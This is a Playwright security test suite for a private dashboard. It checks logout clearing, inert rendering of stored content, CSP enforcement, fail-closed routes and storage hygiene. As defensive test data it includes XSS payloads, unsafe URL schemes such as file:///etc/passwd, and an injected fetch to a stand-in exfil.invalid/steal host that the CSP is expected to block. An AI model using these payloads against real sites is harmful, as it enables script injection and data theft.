import { expect, test } from "@playwright/test";
import type { Page } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
import fixtures from "../fixtures.json" with { type: "json" };

const ORIGIN = "https://localhost:9443";
const ACCESS = "https://localhost:9444";
const EVIL = `<img src="https://exfil.invalid/pixel" onerror="window.__reviewXss=1"><svg onload="window.__reviewXss=2"></svg><script>window.__reviewXss=3</script>[bad](javascript:alert(1))`;
async function login(page: Page) {
  await page.goto(ORIGIN + "/dashboard/");
  await page
    .getByLabel("Dashboard read-only credential")
    .fill("browser-fixture-credential-0000000000000000");
  await page.getByRole("button", { name: "Open your vault" }).click();
  await expect(page.locator(".record-card")).toHaveCount(50);
}
test.beforeEach(async ({ request }) => {
  await request.post(ORIGIN + "/__test__/reset");
  await request.post(ACCESS + "/__test__/reset");
});

test("independent: logout clears private DOM before stalled exchange completes", async ({
  page,
}) => {
  await login(page);
  let release!: () => void;
  const gate = new Promise<void>((resolve) => {
    release = resolve;
  });
  let seen!: () => void;
  const started = new Promise<void>((resolve) => {
    seen = resolve;
  });
  await page.route("**/session/logout", async (route) => {
    seen();
    await gate;
    await route.fulfill({ status: 204 });
  });
  await page.getByRole("button", { name: "Sign out" }).click();
  await started;
  try {
    await expect(page.locator(".record-card")).toHaveCount(0, {
      timeout: 1200,
    });
    await expect(page.getByRole("status")).toContainText(
      "Private data has been cleared",
    );
  } finally {
    release();
  }
  await expect(page.getByLabel("Dashboard read-only credential")).toBeVisible();
});

test("independent: stored content and metadata remain inert; unsafe provenance schemes have no anchors", async ({
  page,
}) => {
  const remote: string[] = [];
  page.on("request", (request) => {
    if (new URL(request.url()).origin !== ORIGIN) remote.push(request.url());
  });
  await login(page);
  const schemes = [
    "javascript:window.__reviewXss=4",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "https://user:pass@example.test/",
    "vbscript:msgbox(1)",
    "//evil.test/",
  ];
  await page.route(
    "**/api/v1/assertions/" + fixtures.details[0].id,
    async (route) => {
      const upstream = await route.fetch();
      const data = await upstream.json();
      data.content = EVIL;
      data.provenance = [{ title: EVIL, excerpt: EVIL }];
      data.source_page.items = schemes.map((url, n) => ({
        ...fixtures.sources[0],
        url,
        title: `unsafe-${n}`,
      }));
      data.source_page.items.push({
        ...fixtures.sources[0],
        url: "https://example.test/evidence",
        title: "safe-source",
      });
      data.source_page.next_cursor = null;
      await route.fulfill({ response: upstream, json: data });
    },
  );
  await page.goto(ORIGIN + "/dashboard/assertions/" + fixtures.details[0].id);
  await expect(page.locator(".assertion-content")).toHaveText(EVIL);
  await expect(
    page.locator(
      ".assertion-content img, .assertion-content script, .metadata-grid img",
    ),
  ).toHaveCount(0);
  await page.getByRole("button", { name: "Sources", exact: true }).click();
  for (let n = 0; n < schemes.length; n++)
    await expect(
      page.getByRole("link", { name: `unsafe-${n}`, exact: false }),
    ).toHaveCount(0);
  await expect(page.getByRole("link", { name: /safe-source/ })).toHaveAttribute(
    "rel",
    "noopener noreferrer",
  );
  expect(
    await page.evaluate(
      () => (window as unknown as Record<string, unknown>).__reviewXss,
    ),
  ).toBeUndefined();
  expect(remote).toEqual([]);
});

test("independent: artifact HTML is text and CSP blocks scripts, connections, frames and base rewriting", async ({
  page,
}) => {
  await login(page);
  await page.goto(ORIGIN + "/dashboard/assertions/" + fixtures.details[0].id);
  await page.getByRole("button", { name: "Artifacts", exact: true }).click();
  await page
    .getByRole("button", { name: "Read text", exact: true })
    .first()
    .click();
  await expect(page.getByLabel("Artifact text")).toContainText("<script>");
  await expect(
    page.getByLabel("Artifact text").locator("script,img,iframe"),
  ).toHaveCount(0);
  const violations = await page.evaluate(async () => {
    const directives: string[] = [];
    document.addEventListener("securitypolicyviolation", (event) =>
      directives.push(event.effectiveDirective),
    );
    const script = document.createElement("script");
    script.textContent = "window.__reviewXss=1";
    document.body.append(script);
    const base = document.createElement("base");
    base.href = "https://exfil.invalid/";
    document.head.append(base);
    const frame = document.createElement("iframe");
    frame.src = "https://exfil.invalid/";
    document.body.append(frame);
    await fetch("https://exfil.invalid/steal").catch(() => undefined);
    await new Promise((resolve) => setTimeout(resolve, 100));
    return {
      directives,
      base: document.baseURI,
      xss: (window as unknown as Record<string, unknown>).__reviewXss,
    };
  });
  expect(violations.xss).toBeUndefined();
  expect(violations.base).toContain(ORIGIN);
  expect(violations.directives).toEqual(
    expect.arrayContaining([
      "script-src-elem",
      "base-uri",
      "frame-src",
      "connect-src",
    ]),
  );
});

test("independent: artifact character ranges use the server's Unicode character offsets", async ({
  page,
}) => {
  await login(page);
  await page.route("**/api/v1/artifacts/*", async (route) => {
    const response = await route.fetch();
    const data = await response.json();
    await route.fulfill({
      response,
      json: {
        ...data,
        content: "🙂",
        total_chars: 1,
        offset: 0,
        next_offset: null,
        size_bytes: 4,
      },
    });
  });
  await page.goto(ORIGIN + "/dashboard/assertions/" + fixtures.details[0].id);
  await page.getByRole("button", { name: "Artifacts", exact: true }).click();
  await page
    .getByRole("button", { name: "Read text", exact: true })
    .first()
    .click();
  await expect(page.getByLabel("Artifact text")).toHaveText("🙂");
  await expect(
    page.getByText("Characters 0–1 of 1", { exact: true }),
  ).toBeVisible();
});

test("independent: anonymous API and undeclared documents/assets fail closed", async ({
  request,
}) => {
  for (const path of [
    "/dashboard/api/v1/assertions/" + fixtures.details[0].id,
    "/dashboard/api/v1/topic-aliases",
    "/dashboard/api/v1/artifacts/" + fixtures.artifact.artifact_id,
  ]) {
    const response = await request.get(ORIGIN + path);
    expect(response.status()).toBe(401);
    expect(await response.text()).not.toContain(fixtures.details[0].content);
  }
  for (const path of [
    "/dashboard/unknown",
    "/dashboard/assets/unknown.js",
    "/dashboard/assets/index.js.map",
    "/dashboard/assets/.env",
    "/dashboard/portal/topics/a%2fb",
    "/dashboard/portal/unclassified/garbage",
    "/mcp",
    "/api/v1/read/capabilities",
  ]) {
    const response = await request.get(ORIGIN + path);
    expect(response.status()).toBe(404);
    expect(response.headers()["content-type"]).not.toContain("text/html");
  }
  const shell = await request.get(ORIGIN + "/dashboard/");
  expect(shell.status()).toBe(200);
  expect(await shell.text()).not.toContain(fixtures.details[0].content);
  expect(shell.headers()["referrer-policy"]).toBe("no-referrer");
  expect(
    (await request.get(ORIGIN + "/dashboard/explorer?query=private")).status(),
  ).toBe(422);
});

test("independent: topic URLs send no referrer and browser storage holds no knowledge", async ({
  page,
  context,
}) => {
  await login(page);
  await page.locator(".record-card .topics a").first().click();
  expect(page.url()).toContain("/portal/topics/");
  const referrers: (string | undefined)[] = [];
  page.on("request", (request) => {
    if (request.url().includes("/dashboard/api/"))
      referrers.push(request.headers()["referer"]);
  });
  await page.getByLabel("Record section").selectOption("Decisions");
  await expect(page.locator(".loading")).toHaveCount(0);
  expect(referrers.length).toBeGreaterThan(0);
  expect(referrers.every((value) => !value)).toBe(true);
  expect(
    await page.evaluate(async () => ({
      local: localStorage.length,
      session: sessionStorage.length,
      caches: await caches.keys(),
      workers: (await navigator.serviceWorker.getRegistrations()).length,
    })),
  ).toEqual({ local: 0, session: 0, caches: [], workers: 0 });
  expect((await context.cookies()).every((cookie) => cookie.httpOnly)).toBe(
    true,
  );
});

test("independent: all statuses are traversed once and catalog counts equal full records", async ({
  page,
}) => {
  await login(page);
  const ids = new Set<string>();
  const statuses = new Set<string>();
  for (let n = 1; n <= 5; n++) {
    await expect(page.locator(".pager")).toContainText(`Page ${n}`);
    for (const href of await page
      .locator(".record-card h3 a")
      .evaluateAll((links) =>
        links.map((link) => link.getAttribute("href")!),
      )) {
      expect(ids.has(href)).toBe(false);
      ids.add(href);
    }
    for (const status of await page
      .locator(".record-card .record-top .badge:first-child")
      .allTextContents())
      statuses.add(status);
    if (n < 5)
      await page
        .getByRole("button", { name: "Next page", exact: true })
        .click();
  }
  expect(ids.size).toBe(205);
  expect([...statuses].sort()).toEqual(
    ["Current evidence", "disputed", "superseded", "uncertain"].sort(),
  );
  await page.getByRole("link", { name: "Portal", exact: true }).click();
  const session = await (
    await page.request.get(ORIGIN + "/dashboard/api/v1/session")
  ).json();
  const response = await page.request.post(
    ORIGIN + "/dashboard/api/v1/catalog/query",
    {
      headers: {
        Origin: ORIGIN,
        "X-Dashboard-Request": "1",
        "X-CSRF-Token": session.csrf_token,
      },
      data: { dimension: "topics", filters: { statuses: [] }, limit: 50 },
    },
  );
  const data = await response.json();
  for (const item of data.items) {
    const expected = Array.from(
      { length: 205 },
      (_, n) => fixtures.summaries[n % fixtures.summaries.length],
    ).filter((row) =>
      item.key === null
        ? row.topics.length === 0
        : (row.topics as string[]).includes(item.key),
    );
    expect(item.assertion_count).toBe(expected.length);
    for (const status of ["current", "uncertain", "disputed", "superseded"])
      expect(item.by_status[status] ?? 0).toBe(
        expected.filter((row) => row.status === status).length,
      );
    const card = page.locator(".catalog-card").filter({
      has: page.getByRole("link", { name: item.label, exact: true }),
    });
    await expect(card).toContainText(String(expected.length));
  }
});

test("independent: HTML success, denial and login redirects clear Access views without executing body", async ({
  page,
  context,
}) => {
  for (const status of [200, 401, 403, 302]) {
    await context.clearCookies();
    await page.goto(ACCESS + "/dashboard/");
    await page.getByRole("button", { name: "Authorize test session" }).click();
    await expect(page.locator(".record-card")).toHaveCount(50);
    await page.route("**/assertions/query", async (route) =>
      route.fulfill({
        status,
        headers: {
          "Content-Type": "text/html",
          ...(status === 302 ? { Location: ACCESS + "/__test__/access" } : {}),
        },
        body: "<h1>attacker edge HTML</h1><script>window.__reviewXss=1</script>",
      }),
    );
    await page.getByRole("button", { name: "Apply filters" }).click();
    await expect(
      page.getByRole("button", { name: "Continue with Cloudflare Access" }),
    ).toBeVisible();
    await expect(page.locator(".record-card")).toHaveCount(0);
    await expect(page.getByText("attacker edge HTML")).toHaveCount(0);
    expect(
      await page.evaluate(
        () => (window as unknown as Record<string, unknown>).__reviewXss,
      ),
    ).toBeUndefined();
    await page.unroute("**/assertions/query");
  }
});

test("independent: absolute session deadline clears idle DOM and copied private cookie is HttpOnly", async ({
  page,
}) => {
  await login(page);
  await page.route("**/api/v1/session", async (route) => {
    const response = await route.fetch();
    const session = await response.json();
    session.expires_at = Date.now() / 1000 + 1;
    await route.fulfill({ response, json: session });
  });
  await page.evaluate(() => window.dispatchEvent(new Event("focus")));
  await expect(page.getByLabel("Dashboard read-only credential")).toBeVisible();
  await expect(page.locator(".record-card")).toHaveCount(0);
  expect(await page.evaluate(() => document.cookie)).not.toContain(
    "__Host-kv_dashboard",
  );
});

test("independent: a late filter response cannot overwrite a new view or survive logout", async ({
  page,
}) => {
  await login(page);
  let release!: () => void;
  const gate = new Promise<void>((resolve) => {
    release = resolve;
  });
  let started!: () => void;
  const pending = new Promise<void>((resolve) => {
    started = resolve;
  });
  await page.route("**/assertions/query", async (route) => {
    const body = route.request().postDataJSON();
    if (body.query !== "slow") {
      await route.continue();
      return;
    }
    const response = await route.fetch();
    const data = await response.json();
    data.items = [
      { ...fixtures.summaries[0], excerpt: "INDEPENDENT_STALE_RESPONSE" },
    ];
    started();
    await gate;
    await route.fulfill({ response, json: data }).catch(() => undefined);
  });
  await page.getByLabel("Exact text").check();
  await page.getByLabel("Words or phrases to match").fill("slow");
  await page.getByRole("button", { name: "Apply filters" }).click();
  await pending;
  await page.getByRole("button", { name: "Reset", exact: true }).click();
  await expect(page.locator(".record-card")).toHaveCount(50);
  release();
  await expect(page.getByText("INDEPENDENT_STALE_RESPONSE")).toHaveCount(0);
  await page.getByRole("button", { name: "Sign out" }).click();
  await expect(page.getByLabel("Dashboard read-only credential")).toBeVisible();
  await expect(page.locator(".record-card")).toHaveCount(0);
});

test("independent: relations preserve direction, conflict/supersession and reach all103 edges", async ({
  page,
}) => {
  await login(page);
  await page.goto(ORIGIN + "/dashboard/assertions/" + fixtures.details[0].id);
  await page
    .getByRole("button", { name: "Relationships", exact: true })
    .click();
  await expect(page.getByText("Supersession", { exact: true })).toBeVisible();
  await expect(
    page.getByText("Recorded conflict", { exact: true }),
  ).toBeVisible();
  const cards: string[] = [];
  for (const count of [50, 50, 3]) {
    await expect(page.locator(".child-list .sub-card")).toHaveCount(count);
    cards.push(
      ...(await page.locator(".child-list .sub-card").allTextContents()),
    );
    if (cards.length < 103)
      await page
        .getByRole("button", { name: "Next page", exact: true })
        .click();
  }
  expect(cards.length).toBe(103);
  expect(new Set(cards).size).toBe(103);
  expect(cards[0]).toContain("Predecessor" + " " + fixtures.details[1].id);
  expect(cards[2]).toContain(fixtures.details[0].id + " to ");
});

test("independent: recoverable service errors and all resolver outcomes retain raw evidence", async ({
  page,
  request,
}) => {
  await login(page);
  await request.post(ORIGIN + "/__test__/scenario/rate");
  await page.getByRole("button", { name: "Apply filters" }).click();
  await expect(page.getByRole("alert")).toContainText("Retry after 30 seconds");
  await request.post(ORIGIN + "/__test__/scenario/normal");
  await page.getByRole("button", { name: "Try again" }).click();
  await expect(page.locator(".record-card")).toHaveCount(50);
  for (const subject of ["conflict", "unknown", "ambiguous", "overflow"]) {
    await page.goto(ORIGIN + "/dashboard/state");
    await page.getByLabel("Subject", { exact: true }).fill(subject);
    await page.getByLabel("Property", { exact: true }).fill("backup");
    await page.getByLabel("Scope", { exact: true }).fill("personal");
    await page.getByRole("button", { name: "Inspect evidence" }).click();
    await expect(page.locator(".raw-evidence details")).not.toHaveCount(0);
    await expect(
      page.getByRole("heading", { name: "Supported value", exact: true }),
    ).toHaveCount(0);
    if (subject === "overflow") {
      await expect(
        page.getByText(/State unresolved: evidence limit/),
      ).toBeVisible();
      for (let n = 1; n <= 21; n++) {
        await expect(page.locator(".raw-evidence .pager")).toContainText(
          `Page ${n}`,
        );
        if (n < 21)
          await page
            .locator(".raw-evidence")
            .getByRole("button", { name: "Next page", exact: true })
            .click();
      }
      await expect(page.locator(".raw-evidence details")).toHaveCount(3);
      await expect(page.locator(".raw-evidence")).toContainText("backup-1002");
    } else
      await expect(
        page.locator(".resolution .badges .badge").first(),
      ).toHaveText(subject);
  }
});

test("independent: detail and temporal pages have accessible mobile controls and keyboard route focus", async ({
  page,
}) => {
  await page.setViewportSize({ width: 320, height: 800 });
  await login(page);
  for (const path of ["/assertions/" + fixtures.details[0].id, "/state"]) {
    await page.goto(ORIGIN + "/dashboard" + path);
    await expect(page.locator("h1")).toBeVisible();
    expect(
      (
        await new AxeBuilder({ page })
          .withTags(["wcag2a", "wcag2aa", "wcag21aa"])
          .analyze()
      ).violations,
    ).toEqual([]);
    const layout = await page.evaluate(() => ({
      width: innerWidth,
      scroll: document.documentElement.scrollWidth,
      overflowing: [...document.querySelectorAll("body *")]
        .filter((element) => element.getBoundingClientRect().right > innerWidth)
        .map((element) => ({
          tag: element.tagName,
          class: element.className,
          right: element.getBoundingClientRect().right,
        }))
        .slice(0, 12),
    }));
    expect(layout, JSON.stringify(layout)).toMatchObject({
      scroll: layout.width,
    });
  }
  await page.getByRole("button", { name: "Navigation", exact: true }).focus();
  await page.keyboard.press("Enter");
  await page.getByRole("link", { name: "Explorer", exact: true }).focus();
  await page.keyboard.press("Enter");
  await expect(page.locator("#main")).toBeFocused();
  await expect(
    page.getByRole("button", { name: "Navigation", exact: true }),
  ).toHaveAttribute("aria-expanded", "false");
});
